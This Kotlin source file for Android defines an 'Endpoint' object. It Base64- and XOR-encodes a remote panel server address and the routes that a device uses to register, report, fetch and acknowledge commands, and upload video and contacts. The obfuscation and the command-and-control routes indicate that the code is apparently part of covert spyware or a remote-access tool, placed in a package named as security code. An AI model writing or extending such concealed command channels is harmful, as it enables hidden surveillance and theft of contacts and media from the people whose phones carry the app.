package com.prf.security.net





















internal object Endpoint {

    private const val KEY = 0x5A

    private fun decode(encoded: String): String {
        val raw = android.util.Base64.decode(encoded, android.util.Base64.NO_WRAP)
        return String(raw.map { (it.toInt() xor KEY).toByte() }.toByteArray(), Charsets.UTF_8)
    }

    
    val defaultServer: String = decode("Mi4uKilgdXUqKDx3Kjs0PzZ0LD8oOT82dDsqKg==")

    



    private fun route(vararg parts: String): String = "/" + parts.joinToString("/")

    private val A = decode("Oyoz")
    private val D = decode("Pj8sMzk/")
    private val P1 = decode("KSo/OSk=")
    private val P2 = decode("KTs2PzM+Pyg=")

    val REGISTER = route(A, D, P1, "register")
    val REPORT = route(A, D, P1, "report")
    val COMMANDS = route(A, D, P1, "commands")
    val ACK = route(A, D, P1, "ack")
    val ATTENDANCE = route(A, D, P2)
    val VIDEO = route(A, D, P2)
    val CONTACTS = route(A, D, P2, decode("OTU0Ljs5Lik="))
    val WINNERS = route(A, D, P1, decode("LTM0ND8oKQ=="))
}
